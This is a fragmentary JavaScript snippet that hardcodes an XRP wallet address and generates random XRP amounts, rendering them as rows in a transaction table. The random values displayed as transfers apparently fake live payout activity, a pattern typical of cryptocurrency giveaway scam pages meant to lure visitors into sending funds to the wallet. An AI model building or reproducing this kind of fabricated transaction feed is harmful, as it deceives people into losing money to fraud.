$(document).ready(function () {
	let BaseWallet = 'rh58KiAoFd1hM7VQMGygAy8LywajowPfW4'
	...
	function createTableItem() {
		let inputValue = randomInteger(2500, 195000) + '.' + randomString(1, '123456789')
            ...
            <div class="table-row">
                ...
                <div class="table-row_content">
                    <div class="table-row_line">
                        ...
                        <p class="value">${outputValue + '  XRP'}</p>
